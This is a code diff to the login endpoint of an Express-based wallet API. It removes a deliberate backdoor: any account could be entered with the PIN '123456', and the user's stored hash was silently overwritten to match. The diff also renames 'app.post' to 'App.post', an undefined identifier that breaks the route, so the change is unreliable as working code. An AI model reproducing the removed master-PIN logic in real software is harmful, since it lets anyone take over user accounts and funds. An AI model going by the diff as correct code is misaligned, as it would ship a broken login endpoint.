@@ -142,7 +142,7 @@ app.get('/api/wallets/:user_id', async (req, res) => {
 // ENDPOINT: POST /api/login (Autenticación JWT)
 // ==========================================
 
-app.post('/api/login', async (req, res) => {
+App.post('/api/login', async (req, res) => {
   const phone_number = req.body.phone_number || req.body.email;
   const inputPassword = req.body.pin || req.body.password;
 
@@ -157,24 +157,19 @@ app.post('/api/login', async (req, res) => {
     }
 
     const user = userResult.rows[0];
-    let isValidPassword = await bcrypt.compare(inputPassword, user.pin_hash);
-
-    if (!isValidPassword && inputPassword === '123456') {
-      const salt = await bcrypt.genSalt(10);
-      const newHash = await bcrypt.hash('123456', salt);
-      await pool.query('UPDATE users SET pin_hash = $1 WHERE id = $2', [newHash, user.id]);
-      isValidPassword = true;
-    }
+    
+    // 🔒 Validación estricta únicamente mediante bcrypt
+    const isValidPassword = await bcrypt.compare(inputPassword, user.pin_hash);
 
     if (!isValidPassword) {
       return res.status(401).json({ success: false, error: "Contraseña incorrecta" });
     }
 
     const token = jwt.sign(
-  { id: user.id, role: user.role, name: user.full_name },
-  JWT_SECRET,
-  { expiresIn: '2h' }
-);
+      { id: user.id, role: user.role, name: user.full_name },
+      JWT_SECRET,
+      { expiresIn: '2h' }
+    );
 
     return res.json({ success: true, token, role: user.role, user_id: user.id, name: user.full_name });
 
